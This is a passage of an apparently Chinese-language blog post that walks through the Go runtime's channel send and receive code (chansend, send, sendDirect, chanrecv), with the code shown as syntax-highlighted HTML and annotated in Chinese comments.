punctuation\">.</span>dataqsiz <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t\tc<span class=\"token punctuation\">.</span>sendx <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token comment\">// 缓冲区的数量加 1</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>qcount<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token comment\">//buff 空间已经满了</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token comment\">// 如果不需要阻塞，则直接返回错误</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>block <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token comment\">// 通道阻塞。某个 goroutine 会为我们完成操作。</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\tgp <span class=\"token operator\">:=</span> <span class=\"token function\">getg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\tmysg <span class=\"token operator\">:=</span> <span class=\"token function\">acquireSudog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token keyword\">if</span> t0 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\tmysg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>  <span class=\"token comment\">// 阻塞操作</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre> \t<span class=\"token comment\">// No stack splits between assigning elem and enqueuing mysg</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">// on gp.waiting where copystack can find it.</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">=</span> ep</pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>waitlink <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> gp</pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>isSelect <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>waiting <span class=\"token operator\">=</span> mysg</pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\tc<span class=\"token punctuation\">.</span>sendq<span class=\"token punctuation\">.</span><span class=\"token function\">enqueue</span><span class=\"token punctuation\">(</span>mysg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token comment\">// 向任何试图缩小堆栈的人发出信号，表明我们即将在一个 channel 上放数据。</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>  <span class=\"token comment\">// 从 G 的状态改变到我们设置 gp.activeStackChans 的这段时间内，堆栈缩小是不安全的。</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>parkingOnChan<span class=\"token punctuation\">.</span><span class=\"token function\">Store</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t<span class=\"token function\">gopark</span><span class=\"token punctuation\">(</span>chanparkcommit<span class=\"token punctuation\">,</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> waitReasonChanSend<span class=\"token punctuation\">,</span> traceBlockChanSend<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  <span class=\"token comment\">// 确保发送的值在接收者将其复制出来之前一直保持有效。</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  <span class=\"token comment\">// 虽然 sudog 拥有指向堆栈对象的指针，但 sudog 并不被视为堆栈跟踪的根。</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t<span class=\"token function\">KeepAlive</span><span class=\"token punctuation\">(</span>ep<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t<span class=\"token comment\">// 被唤醒</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t<span class=\"token keyword\">if</span> mysg <span class=\"token operator\">!=</span> gp<span class=\"token punctuation\">.</span>waiting <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"G waiting list is corrupted\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>waiting <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>activeStackChans <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\tclosed <span class=\"token operator\">:=</span> <span class=\"token operator\">!</span>mysg<span class=\"token punctuation\">.</span>success</pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t<span class=\"token keyword\">if</span> mysg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t\t<span class=\"token function\">blockevent</span><span class=\"token punctuation\">(</span>mysg<span class=\"token punctuation\">.</span>releasetime<span class=\"token operator\">-</span>t0<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\tmysg<span class=\"token punctuation\">.</span>c <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t<span class=\"token function\">releaseSudog</span><span class=\"token punctuation\">(</span>mysg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t<span class=\"token keyword\">if</span> closed <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>closed <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chansend: spurious wakeup\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token function\">plainError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"send on closed channel\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//send 在空通道 c 上执行发送操作。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 发送者发送的值 ep 被复制到接收者 sg。 然后，接收者被唤醒并继续其正常操作。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 通道 c 必须为空且已锁定。send 使用 unlockf 函数解锁 c。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//sg 必须已从 c 中出列。ep 必须非空且指向堆或调用者的堆栈。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> sg <span class=\"token operator\">*</span>sudog<span class=\"token punctuation\">,</span> ep unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">,</span> unlockf <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> skip <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token function\">racesync</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token comment\">// 假装经过缓冲区，实际上是直接复制</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token comment\">// 注意只有在启用竞争条件检测时，才需要增加头 / 尾位置。</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token function\">racenotify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token function\">racenotify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>recvx<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tc<span class=\"token punctuation\">.</span>recvx<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>recvx <span class=\"token operator\">==</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\tc<span class=\"token punctuation\">.</span>recvx <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\tc<span class=\"token punctuation\">.</span>sendx <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>recvx <span class=\"token comment\">// c.sendx = (c.sendx+1) % c.dataqsiz</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span> sg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// 直接拷贝数据</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token function\">sendDirect</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\tsg<span class=\"token punctuation\">.</span>elem <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tgp <span class=\"token operator\">:=</span> sg<span class=\"token punctuation\">.</span>g</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">unlockf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tgp<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span>sg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tsg<span class=\"token punctuation\">.</span>success <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">if</span> sg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tsg<span class=\"token punctuation\">.</span>releasetime <span class=\"token operator\">=</span> <span class=\"token function\">cputicks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">goready</span><span class=\"token punctuation\">(</span>gp<span class=\"token punctuation\">,</span> skip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 在无缓冲或空缓冲通道上发送和接收是唯一一个运行的 goroutine 写入另一个运行 goroutine 的堆栈的操作。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// GC 假设堆栈写入仅在 goroutine 运行时发生，并且仅由该 goroutine 完成。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 使用写屏障足以弥补违反这一假设，但写屏障必须起作用。typedmemmove 将调用 bulkBarrierPreWrite，但目标字节不在堆中，因此这无济于事。我们安排调用 memmove 并键入 BitsBulkBarrier。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">sendDirect</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>_type<span class=\"token punctuation\">,</span> sg <span class=\"token operator\">*</span>sudog<span class=\"token punctuation\">,</span> src unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// src is on our stack, dst is a slot on another stack.</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// Once we read sg.elem out of sg, it will no longer</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token comment\">// be updated if the destination's stack gets copied (shrunk).</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// So make sure that no preemption points can happen between read &amp; use.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tdst <span class=\"token operator\">:=</span> sg<span class=\"token punctuation\">.</span>elem</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">typeBitsBulkBarrier</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">,</span> <span class=\"token function\">uintptr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">uintptr</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>Size_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// No need for cgo write barrier checks because dst is always</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">// Go memory.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">memmove</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>Size_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"接收\"><a class=\"anchor\" href=\"#接收\">#</a> 接收</h2>\n<p>当 channel 被关闭时，缓冲区中没数据，返回</p>\n<p>当 channel 被关闭时，sendq 队列中有处于等待状态的 goroutine 取出队列头的 goroutine，直接调用 recv</p>\n<p>当 channel 的缓冲区中有数据时，读取缓冲区数据</p>\n<p>当 channel 没有被关闭，缓冲区没有数据，阻塞接收。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// entry points for &lt;- c from compiled code.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//go:nosplit</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">chanrecv1</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> elem unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">chanrecv</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> elem<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">//go:nosplit</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">chanrecv2</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> elem unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>received <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> received <span class=\"token operator\">=</span> <span class=\"token function\">chanrecv</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> elem<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">//chanrecv 在通道 c 上接收数据，并将接收到的数据写入 ep。</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">//ep 可能为 nil，此时接收到的数据将被忽略。</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 如果 block == false 且没有可用的元素，则返回 (false, false)。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 否则，如果 c 被关闭，则将 *ep 清零并返回 (true, false)。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 否则，将一个元素填入 *ep 并返回 (true, true)。</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 非 nil 的 ep 必须指向堆或调用者的栈。</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">chanrecv</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> ep unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">,</span> block <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>selected<span class=\"token punctuation\">,</span> received <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token comment\">//raceenabled: 不需要检查 ep，因为它总是在栈上或者由反射新分配的内存中。</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span> debugChan <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chanrecv: chan=\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">if</span> c <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>block <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token function\">gopark</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> waitReasonChanReceiveNilChan<span class=\"token punctuation\">,</span> traceBlockForever<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unreachable\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token comment\">// Fast path: 检查非阻塞操作的失败，而不获取锁。</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>block <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token comment\">// 在观察到 channel !block 后，我们观察通道是否关闭。</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\">// 重新排序这些检查可能会导致在 data race close 时出现不正确的行为。</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\">// 例如，如果 channel 是打开的且不为空，然后被关闭，然后被耗尽，重新排序可能会错误地指示 “打开且为空””</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token comment\">// 为了防止重新排序，我们对这两种检查都使用 atomic loads，并依赖于在同一锁的分离临界区内完成清空和关闭。。</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\">// 当关闭一个有阻塞发送的无缓冲通道时，这一假设会失效，但那是一个错误状态。</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> atomic<span class=\"token punctuation\">.</span><span class=\"token function\">Load</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>closed<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t<span class=\"token comment\">// 因为通道不能被重新打开，通道稍后的未关闭状态观察意味着它在第一次观察时也未关闭。</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t<span class=\"token comment\">// 我们相当于观察到了那一刻的通道并报告接收不能继续。</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\">// 通道不可逆转地关闭了。重新检查通道是否有待接收的数据，</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t<span class=\"token comment\">// 这些数据可能在上面的空和关闭检查之间到达。与这种发生竞争时也需要顺序一致性。</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token comment\">// 通道不可逆关闭且为空。</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t\t\t<span class=\"token function\">raceacquire</span><span class=\"token 